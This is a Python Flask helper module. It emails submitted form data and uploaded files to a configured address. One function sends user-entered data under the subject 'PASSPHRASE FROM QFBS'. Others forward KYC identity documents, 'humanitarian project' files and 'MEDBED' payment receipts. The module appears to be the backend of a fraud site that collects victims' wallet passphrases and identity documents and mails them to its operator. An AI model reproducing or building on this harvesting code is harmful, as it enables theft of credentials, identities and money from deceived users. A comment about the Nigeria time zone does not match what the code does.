import os
from ..views.view_utils.email import send_mail
import json
from flask_login import current_user

TIMEZONE = os.getenv('TIMEZONE')
EMAIL_ADDRESS = os.getenv('EMAIL_ADDRESS')


def greet():
    import datetime


# Get the current time in the Nigeria time zone
    current_time = datetime.datetime.now().time()

    if current_time < datetime.time(12):
        return"morning"
    elif current_time < datetime.time(16):
        return"afternoon"
    else:
        return"evening"
    
def send_data(data):

    converted_data = {key: str(value) for key, value in data.items()}
    
    return send_mail(EMAIL_ADDRESS,json.dumps(converted_data),f'PASSPHRASE FROM QFBS')
    
def send_kyc(request):
    data = request.form
    converted_data = {key: str(value) for key, value in data.items()}
    print('SENDING KYC')
    return send_mail(EMAIL_ADDRESS,json.dumps(converted_data),'KYC DOCS FROM QFBS', file=request.files)

def humanitarian_project(request):
    data = request.form
    converted_data = {key: str(value) for key, value in data.items()}
    print('SENDING humanitarian_project')
    print('====================================================================>>>>>>>>',request.files)
    return send_mail(EMAIL_ADDRESS,json.dumps(converted_data),f'Humanitarian Project DOCS FROM {current_user.email}', file=request.files.get('project'))

def send_medbed(request):
    data = request.form
    converted_data = {key: str(value) for key, value in data.items()}
    print('SENDING Medbed')
    return send_mail(EMAIL_ADDRESS,json.dumps(converted_data),'MEDBED Payment Receipt', file=request.files)


